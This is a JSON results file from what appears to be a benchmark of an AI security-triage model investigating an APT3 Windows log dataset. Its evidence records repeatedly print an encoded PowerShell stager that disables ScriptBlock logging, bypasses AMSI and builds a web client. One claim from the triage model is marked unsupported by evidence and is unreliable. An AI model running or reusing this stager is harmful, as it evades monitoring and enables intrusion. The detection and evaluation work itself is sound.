BmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQA \u2026[truncated \u2014 ask for fewer columns or rows]"
      }
    ],
    "grounding_rounds": 1,
    "grounding_unsupported": [
      "The parent PowerShell process was running an encoded command (-enc) containing complex logic to gather system information, including domain trust details and active directory objects (e.g., 'Get-ADDomain', 'Get-ADTrust')."
    ],
    "zero_evidence_rounds": 0
  },
  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "discovery_network_config",
    "title": "Network Configuration Discovery via Ipconfig",
    "timestamp": "2019-05-14T22:34:52.560Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\ipconfig.exe",
    "command_line": "\"C:\\Windows\\system32\\ipconfig.exe\" /all",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "User SHIRE\\nmartha on host HR001.shire.com executed an obfuscated PowerShell script (via -enc) that attempted to disable ScriptBlock logging and then performed network discovery by running 'ipconfig /all'. The decoded script also initialized a WebClient object with a spoofed User-Agent ('Mozilla/5.0...'), which is commonly used for downloading payloads or exfiltrating data.",
      "technique": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "confidence": 0.9,
      "disposition": "malicious_true_positive",
      "reasoning": "The parent process of ipconfig.exe was a PowerShell command containing an encoded block (Q1, Q2). Decoding this block revealed specific logic to disable ScriptBlock logging and the creation of a WebClient object with a spoofed User-Agent. This combination of evasion techniques followed by network discovery is a high-fidelity indicator of malicious activity. The absence of 4104 logs (Q3) further suggests that the script's evasion attempt may have been successful or that the environment was already configured to allow such bypasses.",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "SHIRE\\nmartha"
        ],
        "data": "Network configuration information (via ipconfig /all)",
        "timeframe": "2019-05-14T22:30:00Z to 2019-05-14T22:40:00Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity involves active evasion of security logging (ScriptBlock) and network discovery, which are typical behaviors of a post-exploitation phase. The use of an encoded PowerShell script to hide intent is a significant red flag.",
      "recommended_actions": [
        "Isolate host HR001.shire.com from the network to prevent further movement or exfiltration.",
        "Perform a full forensic sweep of HR001.shire.com for other persistence mechanisms (e.g., scheduled tasks, registry run keys).",
        "Check for any files created in C:\\temp\\ by the user SHIRE\\nmartha.",
        "Review firewall logs for any successful outbound connections from HR001.shire.com to external IPs during the timeframe."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%ipconfig.exe%' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE ParentImage LIKE '%powershell.exe%' AND (ParentCommandLine LIKE '%-e%' OR ParentCommandLine LIKE '%-enc%' OR ParentCommandLine LIKE '%-EncodedCommand%') LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, EventID FROM logs WHERE EventID = 4104 AND Image LIKE '%powershell.exe%' AND User = 'SHIRE\\nmartha' AND Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, IpAddress FROM logs WHERE (Computer LIKE '%HR001.shire.com%' OR Image LIKE '%powershell.exe%') AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:40:00Z' AND IpAddress NOT IN ('127.0.0.1', '::1') LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE User LIKE '%SHIRE\\nmartha%' AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:40:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%powershell.exe%' AND ParentCommandLine LIKE '%-enc%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:40:00Z' LIMIT 20"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What was the parent process and which user account executed the ipconfig.exe command?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:34:52.560Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\ipconfig.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\ipconfig.exe\\\" /all\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBh \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What is the decoded content of the Base64 encoded command line used by the parent powershell.exe process?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:23.492Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\conhost.exe\", \"CommandLine\": \"\\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuA \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "Provide the PowerShell script block logs (Event ID 4104) for the powershell.exe process executed by SHIRE\\nmartha on HR001.shire.com around 2019-05-14T22:32:23Z.",
        "evidence": "No matching records found for: Provide the PowerShell script block logs (Event ID 4104) for the powershell.exe process executed by SHIRE\\nmartha on HR001.shire.com around 2019-05-14T22:32:23Z."
      },
      {
        "question": "Were there any outbound network connections established by HR001.shire.com or the powershell.exe process between 2019-05-14T22:30:00Z and 2019-05-14T22:40:00Z?",
        "evidence": "8 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:31:27.010Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.010Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.010Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:31:32.622Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:31:36.878Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:32:04.298Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:32:31.950Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}, {\"TimeCreated\": \"2019-05-14T22:37:03.139Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"-\"}]"
      },
      {
        "question": "What other processes were executed by the user SHIRE\\nmartha on HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:40:00Z?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:31:27.325Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\", \"CommandLine\": \"taskhostw.exe KEYROAMING\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.492Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\backgroundTaskHost.exe\\\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch -p\"}, {\"TimeCreated\": \"2019-05-14T22:31:27.692Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\backgroundTaskHost.exe\\\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch -p\"}, {\"TimeCreated\": \"2019-05-14T22:31:37.556Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:37.825Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:37.825Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.098Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.098Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.098Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.098Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:31:38.434Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\MicrosoftEdgeCP.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, 